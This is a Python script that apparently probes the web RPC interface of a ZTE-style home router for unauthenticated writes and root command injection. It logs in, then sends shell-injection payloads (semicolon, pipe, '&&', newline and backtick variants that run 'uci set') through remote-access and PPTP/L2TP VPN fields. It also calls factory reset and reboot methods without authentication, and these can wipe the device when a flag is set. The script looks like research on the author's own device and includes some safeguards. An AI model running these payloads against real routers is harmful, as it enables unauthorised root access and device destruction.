#!/usr/bin/env python3
"""zgap.py — probe the high-value rpcd-ACL surface that earlier scripts missed.

Targets (shapes taken from logs/b04-webui/js/service_rpc.js, cross-checked
against rpcd-acl.md):
  A) zwrt_mc.device.manager fac_close / fac_reset / fac_reboot   (UNAUTH write)
  B) zwrt_router.api router_set_remote_acl   (WAN-side mgmt toggle, NOT rpcd ACL)
  C) zwrt_router.api router_after_sales_save_log   (toggle; hunt for log artifact)
  D) zwrt_tunnel.pptp/l2tp.config.set  + .handle   (server_address/username PLAINTEXT)
  E) zwrt_fota_res.api start_update   (web-writable, absent from web UI; blind)

Injection oracle: same as zrce.py — drop a marker into firewall.@defaults[]._zmark
via the candidate sink, read it back through web uci.get. A hit == root exec.

ROUTER_PW env. Non-destructive by default:
  - fac_reset / fac_reboot are DESTRUCTIVE and stay commented behind DANGER=1.
  - VPN probes use 127.0.0.1 as the base host (no outbound connection attempted).
"""
import os, sys, json, time, hashlib, urllib.request, http.cookiejar

GW = os.environ.get("GW", "192.168.0.1"); PW = os.environ["ROUTER_PW"]; ANON = "0" * 32
DANGER = os.environ.get("DANGER", "0") == "1"
T = lambda: int(time.time() * 1000)
_J = http.cookiejar.CookieJar()
_OP = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(_J))


def post(pl):
    req = urllib.request.Request(f"http://{GW}/ubus/?t={T()}", data=json.dumps(pl).encode(),
        headers={"Content-Type": "application/json", "Accept": "*/*", "User-Agent": "Mozilla/5.0",
                 "Origin": f"http://{GW}", "Referer": f"http://{GW}/", "Z-Mode": "1"})
    try:
        with _OP.open(req, timeout=30) as r: return json.loads(r.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return [{"error": {"code": e.code}}]


def call(s, o, m, p=None):
    for _ in range(3):
        r = post([{"jsonrpc": "2.0", "id": 1, "method": "call", "params": [s, o, m, p or {}]}])[0]
        if not (isinstance(r, dict) and r.get("error", {}).get("code") == 400): return r
        time.sleep(0.3)
    return r


def sha(s): return hashlib.sha256(s.encode()).hexdigest().upper()


def st(r):
    if "error" in r: return f"ACL{r['error'].get('code')}"
    res = r.get("result")
    if not res: return "EMPTY"
    return f"[{res[0]}] {json.dumps(res[1])[:140] if len(res) > 1 else ''}"


# ---- login ----
salt = call(ANON, "zwrt_web", "web_login_info", {})["result"][1]["zte_web_sault"]
S = call(ANON, "zwrt_web", "web_login", {"password": sha(sha(PW) + salt)})["result"][1]["ubus_rpc_session"]
print("session", S[:8])

# ---- uci-marker oracle (firewall.@defaults[0]._zmark) ----
FW_SEC = "@defaults[0]"  # indexed section ref, same idiom as zrecon.py:93


def mark_get():
    r = call(S, "uci", "get", {"config": "firewall", "section": FW_SEC})
    res = r.get("result")
    if res and len(res) > 1: return res[1].get("_zmark", "<absent>")
    return f"<no-get: {st(r)}>"


def fw_section():
    return FW_SEC


def mark_check(label):
    got = mark_get()
    flag = "  <<<<< RCE MARKER LANDED" if got.startswith("RCEOK") else ""
    print(f"    _zmark after {label}: {got!r}{flag}")
    return got.startswith("RCEOK")


MARKER = "RCEOK" + str(int(time.time()) % 100000)
print(f"uci oracle: firewall.{FW_SEC}._zmark  (baseline = {mark_get()!r})")
print(f"inject marker: {MARKER}\n")


# ============================================================
print("=" * 60)
print("A) zwrt_mc.device.manager  fac_close / fac_reset / fac_reboot")
print("    (UNAUTHENTICATED write per rpcd-acl.md:39-51)")
print("=" * 60)
# fac_close: safe to probe — closing factory mode when it isn't open is a no-op.
for params in [{}, {"facPwd": "invalid"}, {"moduleName": "WEB"}]:
    print(f"  [anon] fac_close {list(params)} -> {st(call(ANON, 'zwrt_mc.device.manager', 'fac_close', params))}")
# fac_reset / fac_reboot are destructive: only ping their gate with an invalid
# password to learn whether they are soft-locked (return [2]) or act unconditionally.
# We do NOT trigger them for real.
print("  fac_reset / fac_reboot: probing gate ONLY (invalid facPwd, no real trigger)")
for m in ("fac_reset", "fac_reboot"):
    r = call(ANON, "zwrt_mc.device.manager", m, {"facPwd": "invalid_probe_" + MARKER})
    print(f"  [anon] {m} {{facPwd:'invalid...'}} -> {st(r)}")
    if DANGER:
        print(f"  !! DANGER=1 -> also calling {m} with {{}} (DESTRUCTIVE)")
        print(f"     {m} {{}} -> {st(call(ANON, 'zwrt_mc.device.manager', m, {}))}")
    else:
        print(f"  (skipped real {m}; set DANGER=1 to force — will wipe/reboot)")


# ============================================================
print("\n" + "=" * 60)
print("B) router_set_remote_acl  {remote_web_access_enable, wan_ping_enable, isTest}")
print("    NOTE: this is the WAN-side remote-mgmt toggle, NOT the rpcd ACL.")
print("=" * 60)
print("  baseline:", st(call(S, "zwrt_router.api", "router_get_status", {})))
for params in [
    {"remote_web_access_enable": 0, "wan_ping_enable": 0, "isTest": 1},
    {"remote_web_access_enable": 0, "wan_ping_enable": 0, "isTest": 0},
    {"remote_web_access_enable": 0, "wan_ping_enable": 1},
    {"isTest": "1"},  # does isTest alone do anything odd?
    # injection attempts on every string-ish slot:
    {"remote_web_access_enable": f"0; uci set firewall.{fw_section()}._zmark={MARKER}b"},
    {"wan_ping_enable": f"0 | uci set firewall.{fw_section()}._zmark={MARKER}c"},
    {"isTest": f"1; uci set firewall.{fw_section()}._zmark={MARKER}d"},
]:
    print(f"  set_remote_acl {json.dumps(params)[:90]} -> {st(call(S, 'zwrt_router.api', 'router_set_remote_acl', params))}")
if mark_check("remote_acl"): sys.exit("\n  >>>>>> RCE via router_set_remote_acl <<<<<<")
# restore: ensure remote access stays OFF (security-safe default)
call(S, "zwrt_router.api", "router_set_remote_acl", {"remote_web_access_enable": 0, "wan_ping_enable": 0, "isTest": 0})
print("  (restored remote_web_access_enable=0)")


# ============================================================
print("\n" + "=" * 60)
print("C) router_after_sales_save_log  {enable:0|1}")
print("=" * 60)
print("  enable=1 ->", st(call(S, "zwrt_router.api", "router_after_sales_save_log", {"enable": 1})))
print("  enable=0 ->", st(call(S, "zwrt_router.api", "router_after_sales_save_log", {"enable": 0})))
# an after-sales log package often lands at a known path; probe a few candidates
for path in ["/log/after_sales.log", "/log/aftersales.log", "/tmp/after_sales.log",
             "/backup/after_sales.log", "/log/syslog", "/cgi-bin/after_sales_log",
             "/log/after_sales_save_log", "/log/device_log"]:
    try:
        code = _OP.open(urllib.request.Request(f"http://{GW}/{path}",
                  headers={"Referer": f"http://{GW}/"}), timeout=10).getcode()
        print(f"    GET /{path} -> {code}")
    except urllib.error.HTTPError as e:
        if e.code != 404: print(f"    GET /{path} -> {e.code}")
    except Exception: pass


# ============================================================
print("\n" + "=" * 60)
print("D) zwrt_tunnel.pptp / l2tp  config.set + handle")
print("    JS shape: {auto_start, server_address(PLAIN), username(PLAIN), password(AES)}")
print("=" * 60)
# read current VPN config (read is allowed via zwrt_tunnel.config.get)
print("  zwrt_tunnel.config.get ->", st(call(S, "zwrt_tunnel.config", "get", {})))


def vpn_probe(label, cfg_obj, base_payload, inject_fields):
    """cfg_obj = 'zwrt_tunnel.pptp.config' (the .set target). The matching
    .handle object is cfg_obj without the '.config' suffix."""
    print(f"\n  --- {label} (cfg={cfg_obj}) ---")
    handle_obj = cfg_obj.replace(".config", "")
    for field, payload in inject_fields.items():
        p = dict(base_payload)
        p[field] = payload
        print(f"    set {field}={payload[:70]!r}")
        r = call(S, cfg_obj, "set", p)
        print(f"      -> {st(r)}")
        # trigger via .handle — shape unknown, so sweep the common verbs
        for h in [{"action": "connect"}, {"action": "start"}, {"handle": "connect"}, {}]:
            rh = call(S, handle_obj, "handle", h)
            print(f"      handle {list(h)} -> {st(rh)}")
            time.sleep(2)
            if mark_check(f"{label}.{field}"): sys.exit("\n  >>>>>> RCE via VPN field <<<<<<")


# Base profile: benign loopback, no real outbound attempt. auto_start=0 so we
# control when (if) it connects via .handle.
base = {"auto_start": "0", "server_address": "127.0.0.1", "username": "u", "password": ""}
# injection payloads — same uci-mark technique as zrce.py
SEMI  = f"127.0.0.1; uci set firewall.{fw_section()}._zmark={MARKER}e; uci commit firewall"
PIPE  = f"127.0.0.1 | uci set firewall.{fw_section()}._zmark={MARKER}g"
NL    = f"127.0.0.1\nuci set firewall.{fw_section()}._zmark={MARKER}h\nuci commit firewall"

# pptp.config.set, l2tp.config.set  (object path = 'zwrt_tunnel.pptp.config')
vpn_probe("PPTP", "zwrt_tunnel.pptp.config",
          {"auto_start": "0", "server_address": "127.0.0.1", "username": "u", "password": ""},
          {"server_address": SEMI, "username": f"u; uci set firewall.{fw_section()}._zmark={MARKER}j"})
vpn_probe("L2TP", "zwrt_tunnel.l2tp.config",
          {"auto_start": "0", "server_address": "127.0.0.1", "username": "u",
           "password": "", "tunnel_password": ""},
          {"server_address": PIPE, "username": f"u && uci set firewall.{fw_section()}._zmark={MARKER}k"})
# extra separators on pptp server_address if none landed
if not mark_get().startswith("RCEOK"):
    vpn_probe("PPTP-sep", "zwrt_tunnel.pptp.config",
              {"auto_start": "0", "server_address": "127.0.0.1", "username": "u", "password": ""},
              {"server_address": NL, "username": f"u`uci set firewall.{fw_section()}._zmark={MARKER}l`"})


# ============================================================
print("\n" + "=" * 60)
print("E) zwrt_fota_res.api.start_update  (web-writable, not in web UI)")
print("=" * 60)
# blind shape probe — start_update is not invoked anywhere in service_rpc.js,
# so try the common FOTA param shapes. DO NOT point at a real URL.
for params in [{}, {"url": ""}, {"update_mode": "0"}, {"cancel": "1"},
               {"package_url": "127.0.0.1"}, {"url": "127.0.0.1"}]:
    r = call(S, "zwrt_fota_res.api", "start_update", params)
    print(f"  start_update {list(params)} -> {st(r)}")
# also confirm the safe accessor
print("  get_update_result ->", st(call(S, "zwrt_fota_res.api", "get_update_result", {})))


# ============================================================
print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
final = mark_get()
if final.startswith("RCEOK"):
    print(f"  *** ROOT EXEC CONFIRMED — marker {final} landed in firewall ***")
    print("  Next: replace the uci-set payload with a real ADB-restore command:")
    print("        ubus call zwrt_bsp.usb set '{\"mode\":\"debug\"}'  (via root shell)")
else:
    print(f"  marker absent ({final!r}). All probed sinks validated/sandboxed.")
    print("  -> update adb-lock-investigation.md to close these conclusively.")
